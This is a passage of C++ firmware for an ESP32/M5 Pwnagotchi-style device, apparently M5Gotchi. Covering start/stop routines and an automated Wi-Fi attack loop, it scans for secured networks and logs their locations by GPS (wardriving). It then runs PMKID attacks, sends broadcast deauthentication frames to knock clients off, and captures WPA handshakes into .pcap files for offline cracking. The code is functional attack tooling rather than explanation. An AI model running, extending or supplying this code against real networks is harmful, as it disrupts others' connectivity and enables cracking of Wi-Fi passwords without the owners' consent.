        packetQueue = xQueueCreate(10, sizeof(CapturedPacket *));
        if (!packetQueue) { logMessage("Failed to create packetQueue!"); return false; }
    }
    if (fileWriteQueue == nullptr) {
        fileWriteQueue = xQueueCreate(5, sizeof(FileWriteRequest *));
        if (!fileWriteQueue) { logMessage("Failed to create fileWriteQueue!"); return false; }
    }
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous_rx_cb(&unifiedSnifferCallback);
    esp_wifi_set_promiscuous(true);
    xSemaphoreGive(wifiMutex);
    clientLocked = false;
    memset(targetClientMAC, 0, sizeof(targetClientMAC));
    pwnagotchiRunning = true;
    if(stealth_mode){
        return true;
    }
    BaseType_t r = xTaskCreatePinnedToCore(task, "PwnTask", 8192*4, NULL, 1, &pwnagotchiTaskHandle, 1);
    if (r != pdPASS) {
        logMessage("Failed to create Pwnagotchi task!");
        pwnagotchiRunning = false;
        esp_wifi_set_promiscuous(false);
        return false;
    }
    logMessage("Pwnagotchi started.");
    initNewPersonality();
    return true;
}

bool pwn::beginWardriving() {
    logMessage("Initializing Wardriving mode...");

    if (wifiResultsMutex == nullptr) {
        wifiResultsMutex = xSemaphoreCreateMutex();
        if (!wifiResultsMutex) { logMessage("Failed to create mutex!"); return false; }
    }

    wardrivingRunning = true;
    BaseType_t r = xTaskCreatePinnedToCore(wardrivingTask, "WardrivingTask", 8192*2,
                                           NULL, 1, &wardrivingTaskHandle, 1);
    if (r != pdPASS) {
        logMessage("Failed to create Wardriving task!");
        wardrivingRunning = false;
        esp_wifi_set_promiscuous(false);
        return false;
    }
    logMessage("Wardriving mode started.");
    return true;
}

bool pwn::end() {
    logMessage("Stopping Pwnagotchi/Wardriving...");
    lastSessionTime     = millis();
    lastSessionCaptures = sessionCaptures;
    setMoodToStatus();

    pwnagotchiRunning = false;
    wardrivingRunning = false;

    if (pwnagotchiTaskHandle != nullptr) {
        vTaskDelete(pwnagotchiTaskHandle);
        pwnagotchiTaskHandle = nullptr;
        logMessage("[end] Pwnagotchi task deleted.");
    }
    if (wardrivingTaskHandle != nullptr) {
        vTaskDelete(wardrivingTaskHandle);
        wardrivingTaskHandle = nullptr;
        logMessage("[end] Wardriving task deleted.");
    }

    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);
    esp_wifi_set_promiscuous(true);
    xSemaphoreGive(wifiMutex);
    logMessage("[end] Promiscuous mode restored for manual/pwngrid use.");

    if (packetQueue != nullptr) {
        CapturedPacket *p = nullptr;
        while (xQueueReceive(packetQueue, &p, 0) == pdTRUE) {
            if (p != nullptr) {
                if (p->data != nullptr) { free(p->data); p->data = nullptr; }
                free(p);
            }
        }
        vQueueDelete(packetQueue);
        packetQueue = nullptr;
        logMessage("[end] packetQueue drained and deleted.");
    }

    if (fileWriteQueue != nullptr) {
        FileWriteRequest *req = nullptr;
        while (xQueueReceive(fileWriteQueue, &req, 0) == pdTRUE) {
            if (req != nullptr) {
                // create wardrive save queue for inter-core delegation
                if (wardriveSaveQueue == nullptr) {
                    wardriveSaveQueue = xQueueCreate(5, sizeof(WardriveSaveRequest *));
                    if (!wardriveSaveQueue) { logMessage("Failed to create wardriveSaveQueue!\n"); /* non-fatal */ }
                }
                if (req->beaconFrame != nullptr) {
                    free(req->beaconFrame);
                    req->beaconFrame = nullptr;
                }
                for (CapturedPacket *pkt : req->packets) {
                    if (pkt != nullptr) {
                        if (pkt->data != nullptr) { free(pkt->data); pkt->data = nullptr; }
                        free(pkt);
                    }
                }
                req->packets.clear();
                delete req;
            }
        }
        vQueueDelete(fileWriteQueue);
        fileWriteQueue = nullptr;
        logMessage("[end] fileWriteQueue drained and deleted.");
    }

    if (beaconFrame != nullptr) {
        free(beaconFrame);
        beaconFrame    = nullptr;
        beaconFrameLen = 0;
    }
    beaconDetected = false;
    logMessage("[end] Beacon state cleared.");

    if (file) {
        file.close();
        logMessage("[end] Open file closed.");
    }

    targetAPSet = false;
    memset(targetBSSID,     0, sizeof(targetBSSID));
    memset(eapolMsg,        0, sizeof(eapolMsg));
    clientLocked = false;
    memset(targetClientMAC, 0, sizeof(targetClientMAC));

    hasANonce = false;
    hasSNonce = false;
    hasMIC    = false;
    memset(capturedANonce,    0, sizeof(capturedANonce));
    memset(capturedSNonce,    0, sizeof(capturedSNonce));
    memset(capturedMIC,       0, sizeof(capturedMIC));
    memset(capturedClientMac, 0, sizeof(capturedClientMac));
    logMessage("[end] EAPOL / nonce state cleared.");

    ap = wifiRTResults{};
    logMessage("[end] Target AP struct cleared.");

    pwnedAPs.clear();
    pwnedAPs.shrink_to_fit();
    failedClients.clear();
    failedClients.shrink_to_fit();
    logMessage("[end] pwnedAPs and failedClients cleared.");

    if (wifiResultsMutex != nullptr) {
        if (xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
            g_wifiRTResults.clear();
            g_wifiRTResults.shrink_to_fit();
            xSemaphoreGive(wifiResultsMutex);
        }
        vSemaphoreDelete(wifiResultsMutex);
        wifiResultsMutex = nullptr;
        logMessage("[end] g_wifiRTResults cleared, mutex deleted.");
    }
    saveSettings();
    logMessage("Pwnagotchi/Wardriving fully stopped and all memory released.");
    pwnagothiMode = false;
    return true;
}

void wardrivingTask(void *parameter) {
    logMessage("Wardriving task started.");
    while (wardrivingRunning) {
        if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
            std::vector<wifiRTResults> localResults = g_wifiRTResults;
            xSemaphoreGive(wifiResultsMutex);

            if (localResults.size() > 0) {
                std::vector<wifiSpeedScan> networksToLog;
                for (const auto &result : localResults) {
                    wifiSpeedScan network = {
                        result.ssid,
                        result.rssi,
                        result.channel,
                        result.secure,
                        {result.bssid[0], result.bssid[1], result.bssid[2],
                         result.bssid[3], result.bssid[4], result.bssid[5]}
                    };
                    networksToLog.push_back(network);
                }

                logMessage("Wardriving: found " + String(networksToLog.size()) + " networks.");
                uint32_t gpsTimeout = n_pwnagotchi_personality.gps_timeout_ms;
                wardriveStatus wd = wardrive(networksToLog, gpsTimeout);

                if (wd.success && wd.gpsFixAcquired) {
                    logMessage("Wardrive logged " + String(wd.networksLogged) + " networks @ " +
                              String(wd.latitude, 6) + "," + String(wd.longitude, 6));
                    tot_happy_epochs += wd.networksLogged;  // Track networks logged
                    lastSessionPeers = getPwngridTotalPeers();
                    lastSessionTime = millis();
                    allTimeEpochs += wd.networksLogged;
                } else {
                    logMessage("Wardrive: GPS not acquired or failed");
                    lastSessionTime = millis();
                }
            } else {
                tot_sad_epochs++;  // Track idle scan cycle
                lastSessionTime = millis();
            }

            vTaskDelay(n_pwnagotchi_personality.wardrive_scan_interval_ms / portTICK_PERIOD_MS);
        } else {
            vTaskDelay(100 / portTICK_PERIOD_MS);
        }
    }
    vTaskDelete(NULL);
}

void task(void *parameter) {
    auto whitelist = parseWhitelist();
    setMoodLooking(0);
    while (pwnagotchiRunning) {
        setMoodLooking(0);

        if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
            std::vector<wifiRTResults> localResults = g_wifiRTResults;
            xSemaphoreGive(wifiResultsMutex);
            tot_happy_epochs += localResults.size() / 2;

            for (auto &network : localResults) {
                if (!pwnagotchiRunning) break;
                if (std::find(whitelist.begin(), whitelist.end(), network.ssid) != whitelist.end()) {
                    logMessage("Skipping " + network.ssid + " - whitelisted.");
                    tot_sad_epochs++;
                    continue;
                }
                ap = network;
                if (!networkStillExists(network.ssid, network.channel)) {
                    logMessage("Skipping " + network.ssid + " - no longer visible.");
                    tot_sad_epochs++;
                    continue;
                }
                clientLocked = false;
                memset(targetClientMAC, 0, sizeof(targetClientMAC));
                attackTask(nullptr);
            }

            if (wifiMutex) {
                if (millis() - lastHopTime > CHANEL_HOP_INTERVAL_MS)
                {xSemaphoreTake(wifiMutex, portMAX_DELAY);
                uint8_t ch;
                esp_wifi_get_channel(&ch, nullptr);
                ch = (ch % 13) + 1;
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                xSemaphoreGive(wifiMutex);
                lastHopTime = millis();}
            }
        }
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
    vTaskDelete(NULL);
}

static String sanitizeSsid(const String &ssid) {
    String safe = ssid;
    const char illegal[] = "/\\:*?\"<>|";
    for (size_t i = 0; i < sizeof(illegal) - 1; i++) {
        safe.replace(String(illegal[i]), "_");
    }
    // Trim to a safe length
    if (safe.length() > 32) safe = safe.substring(0, 32);
    return safe;
}

void attackTask(void *parameter) {
    if (!ap.secure) {
        logMessage("Skipping non-secure network: " + ap.ssid);
        return;
    }

    if (ap.rssi < n_pwnagotchi_personality.rssi_threshold) {
        setMoodLooking(0);
        return;
    }

    for (const auto &s : pwnedAPs) if (s == ap.ssid) {
        return;
    }

    if (!networkStillExists(ap.ssid, ap.channel)) {
        logMessage("Network " + ap.ssid + " gone before attack.");
        tot_sad_epochs++;
        allTimeEpochs++;
        return;
    }
    allTimeEpochs++;
    tot_happy_epochs++;
    logMessage("Attacking: " + ap.ssid);
    setMoodApSelected(ap.ssid);

    // --- Phase 1: PMKID ---
    if (n_pwnagotchi_personality.enable_pmkid_attack) {
        logMessage("PMKID attack on: " + ap.ssid);
        setMoodToDeauth(ap.ssid);
        if (runPMKIDAttack(ap.bssid, ap.channel)) {
            logMessage("PMKID success: " + ap.ssid);
            if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
                pwnedAPs.push_back(ap.ssid);
            pwned_ap++;
            sessionCaptures++;
            lastSessionPeers    = getPwngridTotalPeers();
            lastSessionCaptures = sessionCaptures;
            lastSessionTime     = millis();
            tot_happy_epochs   += 3;
            allTimeEpochs++;
            if (n_pwnagotchi_personality.sound_on_pmkid) {
                delay(100); M5.Speaker.tone(1500, 100);
                delay(100); M5.Speaker.tone(2000, 100);
                delay(100); M5.Speaker.tone(2500, 150); delay(150);
            }
            setMoodToNewHandshake(1);
            lastPwnedAP = ap.ssid;
            return;
        }
        logMessage("PMKID failed: " + ap.ssid);
    } else {
        logMessage("PMKID attack disabled, skipping for: " + ap.ssid);
    }

    // --- Phase 2: EAPOL handshake ---
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
    vTaskDelay(100 / portTICK_PERIOD_MS);
    // Re-register the unified callback (not wifiRTScanCallback alone) so that
    // pwngrid peer detection stays alive during the EAPOL capture phase.
    esp_wifi_set_promiscuous_rx_cb(&unifiedSnifferCallback);
    esp_wifi_set_promiscuous(true);
    xSemaphoreGive(wifiMutex);

    if (!networkStillExists(ap.ssid, ap.channel)) {
        logMessage("Network " + ap.ssid + " gone before EAPOL phase.");
        return;
    }

    logMessage("EAPOL capture on: " + ap.ssid);
    setMoodToDeauth(ap.ssid);
    targetAPSet = true;
    memcpy(targetBSSID, ap.bssid, 6);

    for (int i = 0; i < 5; i++) eapolMsg[i] = false;
    hasANonce = hasSNonce = hasMIC = false;

    uint8_t deauth_packet[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5],
        ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5],
        0x00,0x00, 0x01,0x00
    };

    // Initial deauth burst
    uint16_t deauthCount = 0;
    for (uint16_t i = 0; i < n_pwnagotchi_personality.deauth_packets_count; i++) {
        if ((i % 30) == 0 && i > 0) {
            if (!networkStillExists(ap.ssid, ap.channel)) {
                logMessage("Network gone during deauth after " + String(deauthCount) + " pkts.");
                targetAPSet = false;
                return;
            }
        }
        xSemaphoreTake(wifiMutex, portMAX_DELAY);
        if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false) == ESP_OK)
            deauthCount++;
        xSemaphoreGive(wifiMutex);
        vTaskDelay(n_pwnagotchi_personality.deauth_packet_interval / portTICK_PERIOD_MS);
    }
    logMessage("Deauth sent: " + String(deauthCount) + " to " + ap.ssid);

    // =========================================================================
    // EAPOL wait loop — deauth strategy:
    //
    //  - While no client is locked  - keep sending deauths every 70 ms to
    //    force a fresh association from any nearby client.
    //
    //  - Once Msg1 is seen (clientLocked == true) - stop deauthing and give
    //    the client up to CLIENT_HANDSHAKE_TIMEOUT_MS to finish the 4-way
    //    handshake (Msgs 2-3-4).
    //
    //  - If the client does not complete the handshake within that window -
    //    it is considered stalled (e.g. it silently dropped, or this is a
    //    one-way capture). We unlock the client, clear its partial EAPOL
    //    state, and resume deauthing so the next association attempt gets a
    //    clean shot.  This cycle repeats until the full EAPOL_TIMEOUT
    //    expires or a complete handshake is captured.
    // =========================================================================
    static const unsigned long CLIENT_HANDSHAKE_TIMEOUT_MS = 200;

    unsigned long startTime      = millis();
    unsigned long clientLockedAt = 0;          // timestamp of the last lock
    unsigned long EAPOL_TIMEOUT  = n_pwnagotchi_personality.eapol_timeout;

    while (!isHandshakeComplete() && millis() - startTime < EAPOL_TIMEOUT) {

        // --- Periodic network existence check (~every 1 s) ---
        if ((millis() - startTime) % 1000 < 100) {
            if (!networkStillExists(ap.ssid, ap.channel)) {
                logMessage("Network gone during EAPOL wait.");
                lastSessionDeauths += deauthCount;
                tot_sad_epochs++;
                allTimeEpochs++;
                targetAPSet = false;
                return;
            }
        }

        if (clientLocked) {
            // Track when we first locked so we can measure the timeout.
            if (clientLockedAt == 0) clientLockedAt = millis();

            // If the client has had its 200 ms window and still hasn't sent
            // Msg2+Msg3+Msg4, treat it as stalled and start over.
            if (millis() - clientLockedAt >= CLIENT_HANDSHAKE_TIMEOUT_MS) {
                logMessage("Client handshake timeout (200 ms), unlocking and resuming deauth.");

                // Reset client-specific state so the callback accepts the next client
                clientLocked  = false;
                clientLockedAt = 0;
                memset(targetClientMAC, 0, sizeof(targetClientMAC));

                // Clear any partial EAPOL message flags so isHandshakeComplete()
                // cannot fire on stale bits from this failed attempt.
                for (int i = 0; i < 5; i++) eapolMsg[i] = false;

                // Discard any partial nonces/MIC; a new Msg1 will repopulate them.
                hasANonce = hasSNonce = hasMIC = false;
                memset(capturedANonce,    0, sizeof(capturedANonce));
                memset(capturedSNonce,    0, sizeof(capturedSNonce));
                memset(capturedMIC,       0, sizeof(capturedMIC));
                memset(capturedClientMac, 0, sizeof(capturedClientMac));

                // Resume deauthing immediately (fall through to the send below)
            }
        } else {
            // No client locked — reset the lock timer so it starts fresh next lock.
            clientLockedAt = 0;
        }

        // Send deauth only while no client is mid-handshake.
        if (!clientLocked) {
            xSemaphoreTake(wifiMutex, portMAX_DELAY);
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
            xSemaphoreGive(wifiMutex);
        }

        vTaskDelay(70 / portTICK_PERIOD_MS);
    }

    if (isHandshakeComplete()) {
        logMessage("Handshake captured for: " + ap.ssid + " in " + String(millis()-startTime) + "ms");
        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
            pwnedAPs.push_back(ap.ssid);

        for (int i = 0; i < 5; i++) eapolMsg[i] = false;
        vTaskDelay(1000 / portTICK_PERIOD_MS); // Brief settle before draining queue

        // Wardriving: log GPS location if enabled
        if (n_pwnagotchi_personality.enable_wardriving) {
            logMessage("Logging GPS location for: " + ap.ssid);
            std::vector<wifiSpeedScan> currentNetwork;
            currentNetwork.push_back({
                ap.ssid, ap.rssi, ap.channel, ap.secure,
                {ap.bssid[0], ap.bssid[1], ap.bssid[2],
                 ap.bssid[3], ap.bssid[4], ap.bssid[5]}
            });
            wardriveStatus wd = wardrive(currentNetwork, n_pwnagotchi_personality.gps_timeout_ms);
            if (wd.success && wd.gpsFixAcquired) {
                logMessage("GPS logged: Lat=" + String(wd.latitude, 6) +
                           " Lon=" + String(wd.longitude, 6) +
                           " Alt=" + String(wd.altitude, 1));
            } else {
                logMessage("GPS logging failed or timeout");
            }
        }

        FileWriteRequest *req = new FileWriteRequest();
        if (!req) { logMessage("ERR: alloc FileWriteRequest failed"); targetAPSet = false; return; }

        String safeSsid = sanitizeSsid(ap.ssid);
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X_%02X_%02X_%02X_%02X_%02X",
            ap.bssid[0],ap.bssid[1],ap.bssid[2],
            ap.bssid[3],ap.bssid[4],ap.bssid[5]);
        snprintf(req->filename, sizeof(req->filename),
            "/M5Gotchi/handshake/%s_%s_ID_%i.pcap",
            bssidStr, safeSsid.c_str(), random(999));

        req->ssid = ap.ssid;
        memcpy(req->bssid,     ap.bssid,         6);
        memcpy(req->clientMac, capturedClientMac, 6);
        memcpy(req->anonce,    capturedANonce,    32);
        memcpy(req->snonce,    capturedSNonce,    32);
        memcpy(req->mic,       capturedMIC,       16);
        req->hasAnonce = hasANonce;
        req->hasSnonce = hasSNonce;
        req->hasMic    = hasMIC;

        if (beaconDetected && beaconFrame && beaconFrameLen > 0) {
            req->beaconFrame = (uint8_t *)malloc(beaconFrameLen);
            if (req->beaconFrame) {
                memcpy(req->beaconFrame, beaconFrame, beaconFrameLen);
                req->beaconFrameLen = beaconFrameLen;
                uint64_t ts = esp_timer_get_time();
                req->beaconTs_sec  = ts / 1000000;
                req->beaconTs_usec = ts % 1000000;
            }
        }

        beaconDetected = false;
        targetAPSet    = false;

        CapturedPacket *pkt = nullptr;
        while (xQueueReceive(packetQueue, &pkt, 10 / portTICK_PERIOD_MS) == pdTRUE)
            if (pkt) req->packets.push_back(pkt);

        logMessage("Queuing " + String(req->packets.size()) + " pkts for write.");

        if (fileWriteQueue && xQueueSend(fileWriteQueue, &req, portMAX_DELAY) != pdTRUE) {
            logMessage("ERR: fileWriteQueue send failed");
            if (req->beaconFrame) free(req->beaconFrame);
            for (auto *p : req->packets) { if (p && p->data) free(p->data); if (p) free(p); }
            req->packets.clear();
            delete req;
            targetAPSet = false;
            return;
        }

        // If wardriving is enabled and auto mode is on, also enqueue a CSV entry request
        if (n_pwnagotchi_personality.enable_wardriving && pwnagothiMode) {
            // Build a networks vector with single entry (we already have currentNetwork earlier)
            std::vector<wifiSpeedScan> singleNet;
            singleNet.push_back({ap.ssid, ap.rssi, ap.channel, ap.secure, {ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5]}});
            wardriveStatus wd = wardrive(singleNet, n_pwnagotchi_personality.gps_timeout_ms);
            (void)wd; // ignore result here; wardrive will delegate writes to UI if needed
        }

        pwned_ap++;
        sessionCaptures++;
        lastSessionPeers    = getPwngridTotalPeers();
        lastSessionCaptures = sessionCaptures;
        lastSessionTime     = millis();
        tot_happy_epochs   += 3;
        allTimeEpochs++;
        lastSessionDeauths += deauthCount;

        if (n_pwnagotchi_personality.sound_on_handshake) {
            delay(100); M5.Speaker.tone(1500, 100);
            delay(100); M5.Speaker.tone(2000, 100);
            delay(100); M5.Speaker.tone(2500, 150); delay(150);
        }
        lastPwnedAP = ap.ssid;
        setMoodToNewHandshake(1);
        logMessage("File write queued for: " + ap.ssid);
    } else {
        lastSessionPeers    = getPwngridTotalPeers();
        lastSessionTime     = millis();
        lastSessionDeauths += deauthCount;
        tot_sad_epochs++;
        allTimeEpochs++;
        targetAPSet         = false;
        beaconDetected      = false;
        logMessage("Handshake timeout for: " + ap.ssid + ", deauth count: " + String(deauthCount));
        if (std::find(failedClients.begin(), failedClients.end(), ap.ssid) == failedClients.end()) failedClients.push_back(ap.ssid);
        setMoodToAttackFailed(ap.ssid);
    }

    // Reset nonce/MIC state and free beacon buffer
    hasANonce = hasSNonce = hasMIC = false;
    if (beaconFrame) { free(beaconFrame); beaconFrame = nullptr; }

    vTaskDelay(n_pwnagotchi_personality.delay_between_attacks / portTICK_PERIOD_MS);
}